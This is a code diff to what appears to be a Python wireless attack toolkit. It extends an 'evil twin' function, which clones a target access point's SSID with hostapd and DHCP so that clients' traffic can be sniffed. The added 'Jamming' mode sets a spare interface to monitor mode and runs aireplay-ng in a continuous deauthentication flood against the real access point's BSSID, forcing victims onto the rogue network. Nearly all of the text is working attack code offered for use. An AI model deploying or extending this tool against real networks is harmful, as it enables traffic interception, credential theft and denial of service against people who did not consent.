@@ -1133,13 +1133,22 @@ def jam_network(target_ap, interface, jammer_mode):
 def evil_twin(target_ap, twin_mode):
      # Prepare variables
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
+     bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
      channel = target_ap['Channel'] if target_ap['Channel'] else None
      band = target_ap['Band'] if target_ap['Band'] else None
-     print(twin_mode)
-     time.sleep(5)
+
+     jamming_mode = False
+     if twin_mode == 'Jamming':
+          jamming_mode = True
+
+     if jamming_mode:
+          req_interfaces = 3
+     else:
+          req_interfaces = 2
+
 
      def choose_evil_interfaces(detected_interfaces):
-          print(f"Select Interfaces:\n")
+          print(f"Select interfaces:\n")
 
           for idx, interface in enumerate(detected_interfaces, start=1):
                print(f"{idx}. {interface}")
@@ -1158,9 +1167,14 @@ def evil_twin(target_ap, twin_mode):
                          print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
 
           evil_interface = select_interface("Wireless interface number for Evil Twin AP")
+          if jamming_mode:
+               jamming_interface = select_interface("Wireless interface for jamming")
           internet_interface = select_interface("Internet interface number")
 
-          return evil_interface, internet_interface
+          if jamming_mode:
+               return evil_interface, internet_interface, jamming_interface
+          else:
+               return evil_interface, internet_interface
 
      def check_internet(internet_interface):
           print(f'\n{CYAN}[>]{RESET} Testing internet connectivity of "{internet_interface}"')
@@ -1172,7 +1186,7 @@ def evil_twin(target_ap, twin_mode):
                     print(f'{CYAN}[>]{RESET} Internet connection on "{internet_interface}" available\n')
                     return True
                else:
-                    print(f'{CYAN}[>]{RESET} {RED}No internet connection{RESET} on "{internet_interface}"\n')
+                    print(f'{RED}No internet connection on "{internet_interface}"{RESET}\n')
                     return False
           except Exception as e:
                print(f"{RED}Error running ping: {e}{RESET}")
@@ -1185,11 +1199,18 @@ def evil_twin(target_ap, twin_mode):
           else:
                return False
 
+
+     
      if ssid:
           detected_interfaces = []
 
           logo()
           print(f"{CYAN}| Evil Twin (MITM/Sniffer) |{RESET}\n")
+
+          # Switch to silent mode if target network is WPA3
+          if target_ap['Encryption'] == 'WPA3' and jamming_mode:
+               print(f"\n{YELLOW}!! WPA3 protected networks can't be jammed !! Switching to Silent mode...{RESET}")
+               jamming_mode = False
 
           try:
                # Get available interface names, exclude "lo"
@@ -1198,31 +1219,54 @@ def evil_twin(target_ap, twin_mode):
           except subprocess.CalledProcessError as e:
                print(f"{RED}Error executing 'ip -o link show': {e}{RESET}")
 
-          # Prepare interfaces variables
           if detected_interfaces:
-               # Male sure atleast 2 interfaces available
-               if len(detected_interfaces) > 1:
-                    internet_conn = False
-                    while internet_conn == False:
-                         evil_interface, internet_interface = choose_evil_interfaces(detected_interfaces)
+               # Make needed interface count is available
+               if len(detected_interfaces) >= req_interfaces:
+                    while True:
+                         # Prepare interfaces variables
+                         if jamming_mode:
+                              evil_interface, internet_interface, jamming_interface = choose_evil_interfaces(detected_interfaces)
+                         else:
+                              evil_interface, internet_interface = choose_evil_interfaces(detected_interfaces)
+                         
                          # Check if chosen interfaces aren't matching
-                         if evil_interface == internet_interface:
-                              print(f"{RED}Interfaces can't match!{RESET}\n")
-                              continue
+                         if jamming_mode:
+                              if evil_interface == internet_interface or evil_interface == jamming_interface or internet_interface == jamming_interface:
+                                   print(f"{RED}Interfaces can't match!{RESET}\n")
+                                   continue
+                         else: 
+                              if evil_interface == internet_interface:
+                                   print(f"{RED}Interfaces can't match!{RESET}\n")
+                                   continue
+
                          # Check if chosen evil interface is wireless
                          if not is_wireless(evil_interface):
                               print(f"{RED}Interface for Evil Twin AP must be wireless one!{RESET}\n")
                               continue
+                         
+                         # Check if chosen jamming interface is wireless
+                         if jamming_mode:
+                              if not is_wireless(jamming_interface):
+                                   print(f"{RED}Jamming interface must be wireless one!{RESET}\n")
+                                   continue
+
                          # Check if chosen internet interface has internet connection and DNS resolution is working properly
-                         internet_conn = check_internet(internet_interface)
+                         if not check_internet(internet_interface):
+                              continue
+
+                         break # If all requirements met, stop the interface choosing loop
                else:
-                    print(f"{RED}You need atleast 2 network interfaces in order to run this attack!{RESET}")
+                    print(f"{RED}You need atleast {req_interfaces} network interfaces in order to run this attack!{RESET}")
+                    return
+          else:
+               print(f"{RED}No interfaces detected!{RESET}")
+               return
 
           if evil_interface and internet_interface:
                logo()
                print(f"{CYAN}| Evil Twin (MITM/Sniffer) |{RESET}\n")
 
-               print(f'Replicating on {ssid}...')
+               print(f'Replicating "{ssid}" on "{evil_interface}"...')
 
                # Function for running commands
                def run_command(command):
@@ -1230,7 +1274,15 @@ def evil_twin(target_ap, twin_mode):
                          subprocess.run(command, shell=True, check=True)
                     except subprocess.CalledProcessError as e:
                          print(f"{RED}Error running command: {e}{RESET}")
-               
+
+               def run_aireplay(interface, bssid):
+                    if interface and bssid:
+                              try:
+                                   # Continuosly deauth deauth all clients
+                                   command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
+                                   subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                              except:
+                                   pass
 
                # Setup DHCP server
                dhcpd_config_file = "/etc/sysconfig/dhcpd"
@@ -1291,6 +1343,7 @@ macaddr_acl=0
                     """))
                print(f'{CYAN}[>]{RESET} Hostapd configuration set')
 
+               signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user 
                # Add static IP on Evil AP's interface
                run_command(f"sudo ip addr add 192.168.100.1/24 dev {evil_interface}")
                print(f'{CYAN}[>]{RESET} Evil Twin AP interface {evil_interface} configured')
@@ -1310,7 +1363,20 @@ macaddr_acl=0
                # Start dhcp server
                print(f'{CYAN}[>]{RESET} Starting DHCP server for Evil Twin clients\n')
                run_command("sudo systemctl restart dhcpd")
+               signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
 
+               if jamming_mode:
+                    jam_network = multiprocessing.Process(target = run_aireplay, args=(jamming_interface, bssid))
+                    signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user 
+                    run_command(f"sudo nmcli dev set {jamming_interface} managed no") # Stop the NetworkManager from interfering
+                    # Set the jamming interface in monitor mode and target AP channel
+                    run_command(f"sudo ip link set {jamming_interface} down")
+                    run_command(f"sudo iw dev {jamming_interface} set type monitor")
+                    run_command(f"sudo ip link set {jamming_interface} up") 
+                    run_command(f"sudo iw dev {jamming_interface} set channel {channel}")
+                    signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
+                    jam_network.start() # Start the jammer
+                    print(f'{CYAN}[>]{RESET} Jammer on "{ssid}" started')
 
                print(f'{CYAN}[>]{RESET} Starting Evil Twin AP - SSID: "{ssid}"')
                print(f'You can sniff caught clients traffic on "{evil_interface}" using tools like wireshark, tshark or tcpdump!!')
@@ -1318,6 +1384,8 @@ macaddr_acl=0
                run_command("sudo hostapd /etc/hostapd.conf")
                
                signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user 
+               if jamming_mode:
+                    jam_network.terminate() # Stop jammer
 
                # Restore everything
                print(f'\n{CYAN}[>]{RESET} Restoring interfaces and network configuration')
@@ -1326,12 +1394,13 @@ macaddr_acl=0
                run_command("sudo iptables -t nat -F")
                run_command("sudo echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
                run_command(f"sudo nmcli dev set {evil_interface} managed yes")
-               run_command(f"sudo ip addr del 192.168.100.1/24 dev {evil_interface}")
+               if jamming_mode:
+                    run_command(f"sudo nmcli dev set {jamming_interface} managed yes") # Make the jamming interface manageable for NetworkManager
                run_command("sudo systemctl restart NetworkManager")
-
                signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
      else:
           print(f"{RED}\nTarget AP doesn't have SSID set!{RESET}")
+          return
 
 #------------------------------------------------------------------------------------
 
